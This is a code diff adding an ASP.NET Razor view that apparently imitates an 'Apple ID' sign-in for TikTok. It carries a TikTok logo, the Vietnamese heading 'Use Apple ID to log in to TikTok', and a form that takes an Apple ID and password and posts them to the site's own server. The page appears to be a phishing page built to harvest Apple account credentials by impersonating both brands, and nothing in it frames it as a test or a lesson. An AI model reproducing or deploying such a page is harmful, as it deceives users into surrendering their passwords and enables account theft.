@@ -1,0 +1,65 @@
+﻿@{ Layout = null; }
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Apple</title>
+</head>
+<body>
+    <div>
+        @using (Html.BeginForm())
+        {
+            <table align="center">
+                <tr>
+                    <td>
+                        <table align="center">
+                            <tr>
+                                <td align="center">
+                                    <img src="~/Content/image/logotiktok.png" alt="Thumbnail" width="20%" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="center">
+                                    <h1 style="font-family: Arial">
+                                        Sử dụng ID Apple để đăng nhập vào TikTok.
+                                    </h1>
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <h1 style="text-align: center; padding-top: 35px; font-family: 'Malgun Gothic'">Apple</h1>
+
+                        <table align="center" style="width:390px">
+                            <tr>
+                                <td style="width:380px">
+                                    <input type="text"
+                                           placeholder="ID Apple"
+                                           name="uname"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="width:380px; padding-top:10px; padding-bottom:20px">
+                                    <input type="password" placeholder="Password" name="psw" required style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <input type="submit" value="Login" style="width: 380px; height: 55px !important; background-color: #000000 !important; border: none !important; font-weight: bold; color:white" />
+                                    
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        }
+    </div>
+</body>
+</html>
